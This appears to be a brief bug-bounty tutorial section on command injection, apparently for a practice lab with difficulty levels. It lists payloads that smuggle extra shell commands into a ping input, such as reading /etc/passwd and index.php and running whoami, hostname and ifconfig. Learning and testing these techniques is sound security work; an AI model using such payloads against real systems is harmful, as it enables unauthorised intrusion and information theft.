# bug-bounty-tutorial
bug bounty tutorial

## 7.command injection
```
ping -c4 127.0.0.1; ls
ping -c4 127.0.0.1 && ls

127.0.0.1; cat /etc/passwd
127.0.0.1; cat index.php
127.0.0.1; whoami; hostname; ifconfig; ls ../
127.0.0.1; echo 'hacked'
```

## medium
```
127.0.0.1 & whoami & hostname & ifconfig & ls ../
```
